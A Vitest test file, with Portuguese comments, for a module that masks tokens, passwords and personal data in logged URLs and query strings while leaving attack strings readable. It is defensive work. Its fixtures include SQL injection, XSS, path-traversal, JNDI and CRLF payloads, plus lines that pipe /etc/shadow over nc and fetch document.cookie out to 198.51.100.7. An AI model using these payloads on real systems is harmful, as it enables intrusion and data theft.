import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import {
  MAX_URL_LENGTH,
  maskEmbeddedUrls,
  maskQuery,
  maskUrl,
  REDACTED,
  sensitiveName,
  TRUNCATED,
} from './raw-url-mask.js';

// Tudo fictício. Os valores com cara de segredo são montados na hora (o gitleaks não vê segredo no arquivo).
const hash = createHash('sha256').update('valor de demonstração').digest();
const hex = hash.toString('hex');
const base64 = hash.toString('base64');
const base64url = hash.toString('base64url');
const jwt = ['eyJhbGciOiJub25lIn0', 'eyJzdWIiOiJkZW1vIn0', 'assinatura'].join('.');
const uuid = [
  hex.slice(0, 8),
  hex.slice(8, 12),
  hex.slice(12, 16),
  hex.slice(16, 20),
  hex.slice(20, 32),
].join('-');
const UNDECODABLE = '[removido: codificação inválida]';
const SQL = '[removido: parece SQL injection]';
const XSS = '[removido: parece XSS]';
const TRAVERSAL = '[removido: parece travessia de diretório]';

const encoded = (text: string) => encodeURIComponent(text);
const percentAll = (text: string) =>
  [...Buffer.from(text, 'utf8')].map((byte) => `%${byte.toString(16).padStart(2, '0')}`).join('');

describe('máscara da query e da URL do evento bruto', () => {
  describe('o ataque continua legível', () => {
    it.each([
      // SQL injection
      "id=1' OR '1'='1",
      'id=1%27%20OR%20%271%27%3D%271',
      "busca=1'+OR+'1'='1'--",
      'id=-1+UNION+ALL+SELECT+NULL,username,password+FROM+users--',
      "id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
      'id=1;WAITFOR+DELAY+%270:0:5%27--',
      'id=1+AND+SLEEP(5)',
      'id=1+AND+1=CONVERT(int,@@version)',
      'id=1%2527%2520OR%25201%253D1',
      // XSS
      "q=<script>alert('x')</script>",
      'q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
      'q="><img src=x onerror=alert(1)>',
      'q=javascript:alert(String.fromCharCode(88,83,83))',
      // travessia de diretório, com as codificações usuais
      'file=../../../../etc/passwd',
      'file=..%2f..%2f..%2fetc%2fpasswd',
      'file=..%252f..%252fetc%252fpasswd',
      'file=..%c0%af..%c0%afetc/passwd',
      'file=..%u2215..%u2215etc',
      'file=....//....//etc/passwd%00.png',
      // outros
      'cmd=;cat+/etc/shadow|nc+198.51.100.7+4444',
      'q=${jndi:ldap://198.51.100.7:1389/a}',
      'x={{7*7}}&y=%0d%0aSet-Header:x',
    ])('%s', (attack) => {
      expect(maskQuery(attack)).toBe(attack);
    });

    it('no caminho', () => {
      for (const path of [
        '/../../etc/passwd',
        '/..%c0%af..%c0%afetc/passwd',
        '/scripts/..%255c../winnt/system32/cmd.exe?/c+dir+c:',
        '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
        "/produtos?id=1'%20UNION%20SELECT%20null--",
        '/cgi-bin/%%32%65%%32%65/%u002e%u002e/x'.replace('%%32%65%%32%65', '..'),
      ]) {
        expect(maskUrl(path)).toBe(path);
      }
    });

    it('o segredo dentro do ataque sai, e o ataque em volta fica', () => {
      expect(maskQuery("id=1;UPDATE users SET password='novo' WHERE id=1")).toBe(
        `id=1;UPDATE users SET password='${REDACTED}' WHERE id=1`,
      );
      expect(maskQuery("id=1' OR email='ana@cliente.example'--")).toBe(`id=1' OR email='${REDACTED}'--`);
      expect(maskQuery("q=<script>fetch('//198.51.100.7/?c='+document.cookie)</script>")).toBe(
        "q=<script>fetch('//198.51.100.7/?c='+document.cookie)</script>",
      );
    });

    it('um nome de dado pessoal com um ataque: só o dado pessoal sai', () => {
      expect(maskQuery("email=ana@cliente.example'+OR+1=1--")).toBe(`email=${REDACTED}'+OR+1=1--`);
      expect(maskQuery("cpf=123'+UNION+SELECT+1--")).toBe("cpf=123'+UNION+SELECT+1--");
      expect(maskQuery('telefone=%3Cscript%3Ealert(1)%3C/script%3E')).toBe(
        'telefone=%3Cscript%3Ealert(1)%3C/script%3E',
      );
    });

    it('um nome de segredo com um ataque: o valor sai inteiro, e o marcador diz que ataque parece', () => {
      expect(maskQuery("password='+OR+'1'='1")).toBe(`password=${SQL}`);
      expect(maskQuery('senha=%27%20UNION%20SELECT%201')).toBe(`senha=${SQL}`);
      expect(maskQuery('token=<script>alert(1)</script>')).toBe(`token=${XSS}`);
      expect(maskQuery('key=..%252f..%252fetc%252fpasswd')).toBe(`key=${TRAVERSAL}`);
    });
  });

  describe('o valor do parâmetro com nome de segredo', () => {
    it.each([
      'token',
      'access_token',
      'accessToken',
      'id-token',
      'refresh.token',
      'code',
      'password',
      'Password1',
      'newPassword',
      'password_confirmation',
      'userpassword',
      'senha',
      'senha2',
      'secret',
      'client_secret',
      'key',
      'apikey',
      'api_key',
      'x-api-key',
      'auth',
      'session',
      'sid',
      'PHPSESSID',
      'JSESSIONID',
      'connect.sid',
      'jwt',
      'signature',
      'X-Amz-Signature',
      'X-Amz-Credential',
      'X-Amz-Security-Token',
      'sig',
      'otp',
      'código',
      'sessão',
      'chave',
      'cartao',
      'cvv',
      'SAMLResponse',
      'csrf_token',
      'user[password]',
      'user%5Bpassword%5D',
      'pass%77ord',
      '%70%61%73%73%77%6f%72%64',
      'pass%2577ord',
    ])('%s', (name) => {
      expect(maskQuery(`a=1&${name}=curto&b=2`)).toBe(`a=1&${name}=${REDACTED}&b=2`);
      expect(maskQuery(`${name}=a%20b+c%26d%3De;f#g?h`)).toBe(`${name}=${REDACTED}`);
    });

    it('os nomes parecidos, e o valor vazio, ficam', () => {
      const query =
        'keyword=abc&barcode=1&author=x&inside=2&monkey=3&compass=n&tcpflags=SYN&postal=1&encoding=utf8&token=&senha=';
      expect(maskQuery(query)).toBe(query);
      expect(sensitiveName('keyboard')).toBeNull();
    });
  });

  it.each([
    'email',
    'e-mail',
    'userEmail',
    'cpf',
    'CPF_cliente',
    'cnpj',
    'phone',
    'telefone',
    'celular',
    'nome',
    'data_nascimento',
  ])('o valor do parâmetro com nome de dado pessoal: %s', (name) => {
    expect(sensitiveName(name)).toBe('personal');
    expect(maskQuery(`${name}=qualquer+coisa&b=2`)).toBe(`${name}=${REDACTED}&b=2`);
  });

  describe('o valor que parece segredo ou dado pessoal, em qualquer parâmetro', () => {
    it.each([
      ['e-mail', 'ana@cliente.example'],
      ['e-mail codificado', 'ana%40cliente.example'],
      ['e-mail codificado duas vezes', 'ana%2540cliente.example'],
      ['e-mail com mais', 'ana+loja@cliente.example'],
      ['e-mail todo codificado', percentAll('ana@cliente.example')],
      ['CPF', '123.456.789-09'],
      ['CPF codificado', '123%2E456%2E789%2D09'],
      ['CPF sem pontos', '123456789-09'],
      ['CPF só números', '12345678909'],
      ['CNPJ', '12.345.678/0001-95'],
      ['CNPJ codificado', '12.345.678%2F0001-95'],
      ['CNPJ só números', '12345678000195'],
      ['CNPJ com letras', '12.ABC.345/01DE-35'],
      ['CNPJ com letras, sem pontos', '12ABC34501DE35'],
      ['celular com o país', '5511912345678'],
      ['cartão', '4111111111111111'],
      ['JWT', jwt],
      ['hexadecimal longo', hex],
      ['base64', base64],
      ['base64 codificado', encoded(base64)],
      ['base64url', base64url],
      ['UUID', uuid],
      ['UUID quase só de números', '12345678-1234-4abc-abcd-123456789012'],
    ])('%s', (_, value) => {
      expect(maskQuery(`x=${value}&y=1`)).toBe(`x=${REDACTED}&y=1`);
      // Sozinho na query, o `=` do fim do base64 é o do parâmetro.
      expect(maskQuery(value).replace(/=$/, '')).toBe(REDACTED);
    });

    it('no meio do valor: só ele sai', () => {
      expect(maskQuery('q=pedido de ana@cliente.example hoje')).toBe(`q=pedido de ${REDACTED} hoje`);
      expect(maskQuery('q=doc12345678909x')).toBe(`q=doc${REDACTED}x`);
      expect(maskQuery('a@b.example,c@d.example=1')).toBe(`${REDACTED},${REDACTED}=1`);
    });

    it('o que não é: IP, conta AWS, data, nomes de função e de tabela, texto repetido', () => {
      const query =
        'ip=192.168.10.100&conta=111111111111&em=2026-11-24T11:50:00Z&ts=1764000000&f=getElementsByTagName' +
        '&t=information_schema.tables&r=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&n=1.2.3&v=jquery-3.6.0.min.js&u=root@localhost';
      expect(maskQuery(query)).toBe(query);
    });
  });

  describe('aninhado e codificado', () => {
    it('a URL dentro da URL, em qualquer camada', () => {
      expect(maskQuery('redirect=https://app.example/cb?token=abc&next=/home')).toBe(
        `redirect=https://app.example/cb?token=${REDACTED}&next=/home`,
      );
      expect(maskQuery('redirect=https%3A%2F%2Fapp.example%2Fcb%3Ftoken%3Dabc%26next%3D%2Fhome')).toBe(
        `redirect=https%3A%2F%2Fapp.example%2Fcb%3Ftoken%3D${REDACTED}%26next%3D%2Fhome`,
      );
      expect(maskQuery(`redirect=${encoded(encoded('/cb?senha=a b&x=1'))}`)).toBe(
        `redirect=%252Fcb%253Fsenha%253D${REDACTED}%2526x%253D1`,
      );
      expect(maskQuery('u=/a?b=/c?senha=1 2 3')).toBe(`u=/a?b=/c?senha=${REDACTED}`);
    });

    it('JSON e GraphQL num parâmetro', () => {
      expect(maskQuery('data={"password":"a b","x":1}')).toBe(`data={"password":"${REDACTED}","x":1}`);
      expect(maskQuery(`data=${encoded('{"user":{"cpf":12345678909,"senha" : "a\\"b"},"x":1}')}`)).toBe(
        `data=%7B%22user%22%3A%7B%22cpf%22%3A${REDACTED}%2C%22senha%22%20%3A%20%22${REDACTED}%22%7D%2C%22x%22%3A1%7D`,
      );
      expect(maskQuery('q={login(email:"a@b.example",password:"x y"){id}}')).toBe(
        `q={login(email:"${REDACTED}",password:"${REDACTED}"){id}}`,
      );
      expect(maskQuery('d={\\"token\\":\\"a b\\",\\"x\\":1}')).toBe(
        `d={\\"token\\":\\"${REDACTED}\\",\\"x\\":1}`,
      );
    });

    it('o separador codificado dentro do segredo não o corta, e o de fora não esconde o ataque', () => {
      expect(maskQuery('u=/x?senha=a%26b&y=1')).toBe(`u=/x?senha=${REDACTED}&y=1`);
      expect(maskQuery('d={"senha":"a%22b","x":1}')).toBe(`d={"senha":"${REDACTED}","x":1}`);
      expect(maskQuery('id=1%20AND%20password=abc%20OR%201=1')).toBe(
        `id=1%20AND%20password=${REDACTED}%20OR%201=1`,
      );
    });

    it('os números do escape não são parte do valor', () => {
      expect(maskQuery('q=contato%20ana@cliente.example%0A')).toBe(`q=contato%20${REDACTED}%0A`);
      expect(maskQuery('id=1%20123456789&n=%2712345678')).toBe('id=1%20123456789&n=%2712345678');
      expect(maskQuery('q=a%252012345678909')).toBe(`q=a%2520${REDACTED}`);
    });

    it('um valor aleatório depois de palavras ligadas: só ele sai', () => {
      const parts = hex.match(/.{16}/g) as string[];
      expect(maskUrl(`/v1b2/um/caminho/bem/comprido/ate/aqui/${parts[0]}-${parts[1]}/fim`)).toBe(
        `/v1b2/um/caminho/bem/comprido/ate/aqui/${REDACTED}/fim`,
      );
    });

    it('o ponto e vírgula, o caminho e o fragmento', () => {
      expect(maskQuery('a=1;jsessionid=ABC')).toBe(`a=1;jsessionid=${REDACTED}`);
      expect(maskUrl('/a;jsessionid=ABC/b?x=1')).toBe(`/a;jsessionid=${REDACTED}/b?x=1`);
      expect(maskUrl('https://app.example/x?state=1#access_token=abc&b=2')).toBe(
        `https://app.example/x?state=1#access_token=${REDACTED}&b=2`,
      );
      expect(maskUrl('GET /x?token=abc HTTP/1.1')).toBe(`GET /x?token=${REDACTED}`);
      expect(maskQuery('h=x, Authorization: Bearer abc.def, y')).toBe(`h=x, Authorization: ${REDACTED}, y`);
    });

    it('`usuario:senha@` da URL sai, e o host fica', () => {
      expect(maskUrl('https://ana:segredo@host.example/x')).toBe(`https://${REDACTED}@host.example/x`);
      expect(maskQuery('u=https%3A%2F%2Fana%3Asegredo%40host.example%2Fx')).toBe(
        `u=https%3A%2F%2F${REDACTED}%40host.example%2Fx`,
      );
      expect(maskUrl('//ana:p@ss@host.example/x')).toBe(`//${REDACTED}@host.example/x`);
      expect(maskUrl('https://confiavel.example@198.51.100.7/')).toBe(`https://${REDACTED}@198.51.100.7/`);
    });

    it('no caminho: e-mail, documento, JWT e id aleatório; os vizinhos ficam', () => {
      expect(maskUrl('/u/ana@cliente.example/edit')).toBe(`/u/${REDACTED}/edit`);
      expect(maskUrl('/clientes/123.456.789-09/contas')).toBe(`/clientes/${REDACTED}/contas`);
      expect(maskUrl(`/reset/${jwt}/ok`)).toBe(`/reset/${REDACTED}/ok`);
      expect(maskUrl(`/convite/${hex}/aceitar`)).toBe(`/convite/${REDACTED}/aceitar`);
      expect(maskUrl('/wp-content/plugins/akismet/readme.txt')).toBe(
        '/wp-content/plugins/akismet/readme.txt',
      );
    });
  });

  describe('o que não decodifica fecha mascarado', () => {
    it.each([
      ['% solto', 'q=%', `q=${UNDECODABLE}`],
      ['% sem hexadecimal', 'q=a%zzb', `q=${UNDECODABLE}`],
      ['byte que não é UTF-8', 'q=S%E3o', `q=${UNDECODABLE}`],
      ['sequência cortada', 'q=abc%c3', `q=${UNDECODABLE}`],
      ['camadas demais', 'q=%252525252541', `q=${UNDECODABLE}`],
      ['nome que não decodifica', '%zz=valor&a=1', `${UNDECODABLE}=${UNDECODABLE}&a=1`],
      ['só o trecho em volta', "q=' OR x LIKE '%zz%'--", `q=' OR x LIKE '${UNDECODABLE}'--`],
    ])('%s', (_, query, expected) => {
      expect(maskQuery(query)).toBe(expected);
    });

    it('no caminho, só o segmento; e o % de verdade (`%25`) fica', () => {
      expect(maskUrl('/a/%zz/b')).toBe(`/a/${UNDECODABLE}/b`);
      expect(maskUrl('/a/%252525252541/b')).toBe(`/a/${UNDECODABLE}/b`);
      expect(maskQuery("q=100%25&r=%27%20LIKE%20'%25admin%25'")).toBe(
        "q=100%25&r=%27%20LIKE%20'%25admin%25'",
      );
    });
  });

  describe('tamanho e tempo limitados', () => {
    it('o texto longo demais é cortado num separador, e o que ficaria pela metade não sai', () => {
      const long = `a=1&${'b=2&'.repeat(5_000)}`;
      const masked = maskQuery(long);
      expect(masked.length).toBeLessThanOrEqual(MAX_URL_LENGTH + TRUNCATED.length);
      expect(masked.endsWith(`b=2${TRUNCATED}`)).toBe(true);
      // O e-mail cortado no limite não sobra pela metade.
      const cut = `${'x'.repeat(MAX_URL_LENGTH - 12)} ana@cliente.example`;
      expect(maskQuery(cut)).not.toContain('ana');
      expect(maskUrl('y'.repeat(MAX_URL_LENGTH + 1))).toBe(TRUNCATED);
    });

    it('os textos hostis, no tamanho máximo, são vistos em tempo linear', () => {
      const fill = (piece: string, size: number) =>
        piece.repeat(Math.ceil(size / piece.length)).slice(0, size);
      const hostile = [
        '%',
        '%25',
        '%2525252525',
        '%c3',
        '%u0041',
        '&',
        '=',
        'a=',
        'a&',
        'token=',
        'token=&',
        'token:"',
        'nome=<script;',
        'nome:../',
        '(token=',
        '?token=',
        'a1b/aaaa/',
        'a1b2c3d4e5f6g7h8i9j0-',
        '"token":"',
        '\\"token\\":\\"',
        '@',
        'a@',
        'a@a.',
        '@a.aa',
        '//',
        '//a:b@',
        '//@',
        'eyJa.',
        'eyJ',
        'a1b',
        'a1b-',
        '1-',
        '123.456.789-',
        '12345678-1234-',
        ';',
        '+',
        "'",
        '/%2525252525',
        'Authorization: Bearer ',
        'é@',
      ];
      const timed = (size: number) => {
        let worst = 0;
        for (const piece of hostile) {
          const text = fill(piece, size);
          let best = Infinity;
          for (let round = 0; round < 3; round += 1) {
            const start = performance.now();
            maskQuery(text);
            maskUrl(text);
            maskQuery(`x=${text}`);
            maskEmbeddedUrls(`/${text}?a=`);
            best = Math.min(best, performance.now() - start);
          }
          worst = Math.max(worst, best);
        }
        return worst;
      };
      timed(1_000);
      // Medido: 23 ms no pior; quadrático, centenas. O melhor de três, com folga para a máquina carregada.
      expect(timed(MAX_URL_LENGTH - 8)).toBeLessThan(300);
    });

    it('um segredo num parâmetro com nome de segredo nunca sai, em qualquer codificação e posição', () => {
      const secret = 'S3gredo-Demo';
      const variants = [secret, encoded(secret), percentAll(secret), percentAll(percentAll(secret))];
      const names = ['token', 'user[senha]', 'pass%77ord', 'X-Amz-Signature'];
      const around = ['', 'a=1&', "id=1' OR '1'='1&", 'q=%zz&', '&&', 'x;y=2&', 'u=https://a:b@c.example/&'];
      const opened = (text: string) => {
        let out = text;
        for (let i = 0; i < 3; i += 1) {
          try {
            out = decodeURIComponent(out);
          } catch {
            break;
          }
        }
        return out;
      };
      for (const name of names) {
        for (const value of variants) {
          for (const before of around) {
            for (const masked of [
              maskQuery(`${before}${name}=${value}&z=1`),
              maskUrl(`/p?${before}${name}=${value}`),
              maskUrl(`https://app.example/p?u=${encoded(`/q?${name}=${value}&w=1`)}`),
              maskEmbeddedUrls(`veja https://app.example/p?${name}=${value} agora`),
            ]) {
              expect(masked).not.toContain(value);
              expect(opened(masked)).not.toContain(secret);
            }
          }
        }
      }
    });
  });

  describe('URL dentro de um texto qualquer', () => {
    it('só a URL com query é vista; o resto do texto fica', () => {
      expect(maskEmbeddedUrls('erro em "GET /x?token=abc HTTP/1.1" 200')).toBe(
        `erro em "GET /x?token=${REDACTED} HTTP/1.1" 200`,
      );
      expect(maskEmbeddedUrls('path=/x?token=abc status=200')).toBe(`path=/x?token=${REDACTED} status=200`);
      expect(maskEmbeddedUrls('veja https://a.example/x?token=abc agora')).toBe(
        `veja https://a.example/x?token=${REDACTED} agora`,
      );
      expect(maskEmbeddedUrls("https://x.example/?a=1'&token=abc")).toBe(
        `https://x.example/?a=1'&token=${REDACTED}`,
      );
      expect(maskEmbeddedUrls('clone de https://ana:segredo@git.example/r.git')).toBe(
        `clone de https://${REDACTED}@git.example/r.git`,
      );
    });

    it('sem URL com query, nada muda: a identidade do CloudTrail, o caminho de arquivo, o e-mail solto', () => {
      for (const text of [
        'arn:aws:sts::111111111111:assumed-role/Admin/ana@empresa.example',
        'ana@empresa.example',
        '/var/log/nginx/access.log',
        `s3/${hex}`,
        'Mozilla/5.0 (compatible; +https://bot.example/sobre)',
        '',
      ]) {
        expect(maskEmbeddedUrls(text)).toBe(text);
      }
    });
  });
});
